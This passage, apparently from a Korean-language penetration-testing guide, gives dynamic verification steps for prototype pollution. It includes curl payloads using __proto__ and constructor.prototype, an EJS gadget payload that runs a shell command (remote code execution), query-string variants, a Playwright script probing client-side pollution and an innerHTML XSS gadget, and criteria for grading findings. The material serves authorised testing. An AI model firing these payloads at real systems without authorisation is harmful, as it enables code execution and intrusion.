### Phase 2: 동적 테스트 (검증)


**서버사이드 Prototype Pollution 테스트:**

1. `__proto__` 키를 포함한 JSON 페이로드 전송:
```bash
# 기본 __proto__ 페이로드
curl -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "true"}}'

# constructor.prototype 경로
curl -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "true"}}}'
```

2. 오염 확인 — 오염된 속성이 다른 응답에 반영되는지 확인:
```bash
# 오염 후 다른 엔드포인트에서 빈 객체에 해당 속성이 존재하는지 확인
# 예: 사용자 정보 API 응답에 "polluted" 필드가 추가되었는지
curl -s "https://target.com/api/user/profile" | grep "polluted"

# 또는 서버 상태 변화 (500 에러, 다른 응답 구조 등) 관찰
```

3. 가젯 활용 테스트 (가젯을 식별한 경우):
```bash
# EJS 가젯 예시 — RCE
curl -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# 이후 EJS 템플릿 렌더링을 트리거하는 페이지 요청
curl -s "https://target.com/dashboard"
```

**쿼리 파라미터 기반 테스트 (qs 파서):**
```bash
# qs 파서가 중첩 객체를 허용하는 경우
curl -s "https://target.com/api/search?__proto__[polluted]=true"
curl -s "https://target.com/api/search?constructor[prototype][polluted]=true"
```

**클라이언트사이드 Prototype Pollution (CSPP) Playwright 테스트:**
```javascript
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();

  // URL fragment 기반 CSPP
  await page.goto('https://target.com/page#__proto__[polluted]=true');
  const polluted1 = await page.evaluate(() => ({}).polluted);
  console.log('Fragment CSPP:', polluted1);
  if (polluted1 === 'true') console.log('CONFIRMED: Client-side PP via fragment');

  // URL 파라미터 기반 CSPP
  await page.goto('https://target.com/page?__proto__[polluted]=true');
  const polluted2 = await page.evaluate(() => ({}).polluted);
  console.log('Query CSPP:', polluted2);
  if (polluted2 === 'true') console.log('CONFIRMED: Client-side PP via query');

  // constructor.prototype 경로
  await page.goto('https://target.com/page?constructor[prototype][polluted]=true');
  const polluted3 = await page.evaluate(() => ({}).polluted);
  console.log('Constructor CSPP:', polluted3);
  if (polluted3 === 'true') console.log('CONFIRMED: Client-side PP via constructor');

  // 가젯 영향 확인 (오염 후 DOM 변화 관찰)
  await page.goto('https://target.com/page#__proto__[innerHTML]=<img/src/onerror=alert(1)>');
  const alertFired = await page.evaluate(() => {
    return new Promise(resolve => {
      window.addEventListener('error', () => resolve(true));
      setTimeout(() => resolve(false), 3000);
    });
  });
  console.log('Gadget XSS:', alertFired);

  await browser.close();
})();
```

Playwright 실행이 불가능한 경우에만 "후보 (브라우저 테스트 필요)"로 보고한다.

**검증 기준:**
- **확인됨**: 페이로드 전송 후 프로토타입이 실제로 오염되어 다른 응답/동작에 영향을 미치는 것을 직접 확인함 (응답에 오염된 속성 반영, 에러 발생, 가젯 체인 실행 등)
- **후보**: 소스코드상 취약 패턴이 존재하지만 동적 테스트로 오염을 확인하지 못함
- **보고서 제외**: 동적 테스트 결과 키 필터링 등으로 오염이 차단되는 것을 확인한 경우
